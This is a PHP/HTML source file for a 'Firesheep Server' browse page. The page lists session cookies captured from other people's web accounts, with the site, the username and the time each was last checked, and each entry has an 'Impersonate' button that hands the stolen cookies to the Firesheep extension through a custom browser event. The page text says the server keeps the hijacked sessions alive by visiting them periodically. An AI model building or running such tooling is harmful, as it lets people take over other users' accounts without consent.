<html>
    <head>
        <title>Firesheep Server -- Browse</title>
<script>
    function urlDecode(s)
    {
       return decodeURIComponent( s.replace( /\+/g, '%20' ).replace( /\%21/g, '!' ).replace( /\%27/g, "'" ).replace( /\%28/g, '(' ).replace( /\%29/g, ')' ).replace( /\%2A/g, '*' ).replace( /\%7E/g, '~' ) );
    }

    function causeEvent(cookieNames, cookieValues, siteUrl)
    {
        var element = document.createElement("FiresheepDataElement");
        element.setAttribute("cookieNames", urlDecode(cookieNames));
        element.setAttribute("cookieValues", urlDecode(cookieValues));
        element.setAttribute("siteUrl", urlDecode(siteUrl));
        document.documentElement.appendChild(element);

        var evt = document.createEvent("Events");
        evt.initEvent("FiresheepEvent", true, false);
        element.dispatchEvent(evt);
    }
</script>

    </head>
    <body>
        <h3>Firesheep Server Captured Credentials</h3>
        <p style="width:75%">This server checks the credentials and attempts to ensure they do not expire by visiting them 
           every so often.  In order for the Impersonate button to work, you must <b>select "Parse Firesheep Website" under
           the Tools menu</b>.  This command was added because I did not want Firesheep running code on every website that 
           you visited.</p>
        <table border="1px" style="width:75%">
            <tr>
                <td style="width:20%">Site</td>
                <td style="width:40%">User</td>
                <td style="width:20%">Time last checked</td>
                <td style="width:20%">Click To Impersonate</td>
            </tr>
<?php

require_once("user.php");
require_once("database.php"); 

$users = Database::GetAllUsers();
$i = 0;
foreach($users as $user)
{
    $cookieNames = urlencode(json_encode($user->cookieNames, JSON_HEX_QUOT));
    $cookieValues =urlencode(json_encode($user->cookieValues, JSON_HEX_QUOT));
    $siteUrl = urlencode($user->siteUrl);

    $firesheepButton = "\n<input type='button' value='Impersonate' id='firesheepButton$i' " . 
                       " onclick=\"causeEvent('$cookieNames','$cookieValues','$siteUrl');\" />\n";

    echo "<tr><td>" . $user->site .  "</td><td>";
    if($user->avatarUrl != "")#show the picture only if we have one
        echo "<img src='" . $user->avatarUrl . "'/>";
    if($user->name == "")
    {
        echo "<form action='fixUserName.php' method='POST'>
                <input type='hidden' name='userId' id='userId' value='" . $user->id . "' />
                <input type='text' id='username' name='username' />
                <input type='submit' value='Fix Username' />
            </form>";
    }
    else    
        echo $user->name .  "</td>";

    echo "<td>" . $user->timeLastChecked . "</td>" .
        "<td>$firesheepButton</td>" .
        "</tr>";

    $i++;
}

?>
        </table>
    </body>
</html>
